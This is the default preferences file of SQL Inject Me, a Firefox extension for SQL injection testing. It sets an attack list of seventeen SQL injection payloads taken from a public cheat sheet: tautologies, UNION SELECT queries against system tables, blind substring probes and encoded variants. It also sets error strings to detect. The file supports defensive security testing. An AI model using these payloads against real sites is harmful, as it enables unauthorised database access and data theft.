/*
Copyright 2007 Security Compass

This file is part of SQL Inject Me.

SQL Inject Me is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

SQL Inject Me is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with SQL Inject Me.  If not, see <http://www.gnu.org/licenses/>.
*/

pref('extensions.sqlime.attacks', '[{"string":"1 OR 1=1","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1\' OR \'1\'=\'1","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1\'1","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1 EXEC XP_","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1 AND 1=1","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1\' AND 1=(SELECT COUNT(*) FROM tablenames); --","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1 AND USER_NAME() = \'dbo\'","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"\\\'; DESC users; --","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1\\\'1","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1\' AND non_existant_table = \'1","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"\' OR username IS NOT NULL OR username = \'","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\' --","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"1 UNI/**/ON SELECT ALL FROM WHERE","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"%31%27%20%4F%52%20%27%31%27%3D%27%31","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"&#x31;&#x27;&#x20;&#x4F;&#x52;&#x20;&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;","sig":"ha.ckers.org SQL Injection Cheet Sheet"},{"string":"&#49&#39&#32&#79&#82&#32&#39&#49&#39&#61&#39&#49","sig":"ha.ckers.org SQL Injection Cheet Sheet"}]');
pref('extensions.sqlime.errorstrings', '[{"string":"Database Error"}, {"string":"DB Err"}]');
pref('extensions.sqlime.prefnumattacks', 9);
pref('extensions.sqlime.showcontextmenu', true);
pref('extensions.sqlime.numtabstouse', 9);